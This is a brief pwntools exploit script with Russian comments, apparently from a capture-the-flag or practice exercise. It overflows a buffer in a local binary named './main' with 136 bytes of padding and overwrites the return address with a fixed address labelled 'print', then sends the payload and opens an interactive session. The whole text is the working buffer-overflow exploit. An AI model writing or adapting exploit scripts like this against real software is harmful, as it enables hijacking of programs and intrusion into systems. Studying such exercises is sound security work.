from pwn import *

# Смещение
offset = 128 + 8

# Формируем полезную нагрузку
# payload = cyclic(300)
payload = b"A" * offset
#payload += p64(0x0000000000401276) #leave
payload += p64(0x0000000000404080) #print


# Подключаемся к сервису
conn = process("./main")
input("hello")
conn.send(payload)
conn.interactive()